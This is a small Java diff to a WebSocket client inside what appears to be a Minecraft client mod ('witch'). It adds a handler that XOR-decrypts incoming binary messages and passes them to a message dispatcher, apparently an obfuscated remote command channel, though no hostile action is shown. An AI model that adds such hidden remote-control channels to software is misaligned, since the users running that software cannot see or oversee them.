@@ -5,6 +5,7 @@ import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
 
 import java.net.URI;
+import java.nio.ByteBuffer;
 
 import static me.soda.witch.Witch.mc;
 
@@ -26,6 +27,11 @@ public class WSClient extends WebSocketClient {
     @Override
     public void onMessage(String message) {
         MessageHandler.handle(message);
+    }
+
+    @Override
+    public void onMessage(ByteBuffer bytes) {
+        MessageHandler.handle(XOR.decrypt(bytes.array()));
     }
 
     @Override
